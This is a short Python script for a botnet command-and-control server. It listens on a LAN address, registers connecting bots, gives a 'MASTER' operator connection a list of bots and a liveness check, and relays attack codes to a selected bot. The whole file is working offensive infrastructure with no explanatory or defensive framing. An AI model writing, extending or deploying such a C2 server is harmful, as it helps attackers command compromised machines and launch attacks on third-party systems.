#!/usr/bin/env python3
import socket
import threading
from time import sleep

class C2server():
    def __init__(self):
        self.connections = []
        self.addresses = []
        self.masterIP = "192.168.1.134"
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.s.bind(("192.168.1.134",7000))
        self.s.listen()

    def master(self,conn):
        while True:
            data = conn.recv(1024)
            if data == b'l': #LIST
                self.check_conns() #CHECK CONNECTIONS
                for i in self.addresses: #SEND CONNECTION ADDRESSES
                    for j in i:
                        string = str(j)
                        conn.send(string.encode("utf-8"))
                        sleep(0.01)
                sleep(0.01)
                conn.send(b'q')
            elif data == b'c':
                data = conn.recv(2)
                command = data.decode("utf-8")
                self.send_attack(int(command[0]),command[1])
            elif data == b'':
                break

    def catcher(self):
        while True:
            conn, addr = self.s.accept()
            if conn.recv(6) == b'MASTER': #Check if is it master
                x = threading.Thread(target=self.master, args=(conn,))
                x.start()
            else:
                self.connections.append(conn)
                self.addresses.append(addr)
                print(f"[+] {addr[0]}:{addr[1]} added!") #TEMP

    def check_conns(self):
        for i in self.connections:
            try:
                for _ in range(5):
                    i.send(b'alive?')
            except:
                index = self.connections.index(i)
                print(f"[+] {self.addresses[index][0]}:{self.addresses[index][1]} disconnected!") #TEMP
                self.addresses.pop(index)
                self.connections.remove(i)

    def send_attack(self,target,attack):
        self.connections[target].send(attack.encode("utf-8"))
            
    def start(self):
        self.catcher()

if __name__ == "__main__":
    server = C2server()
    server.start()
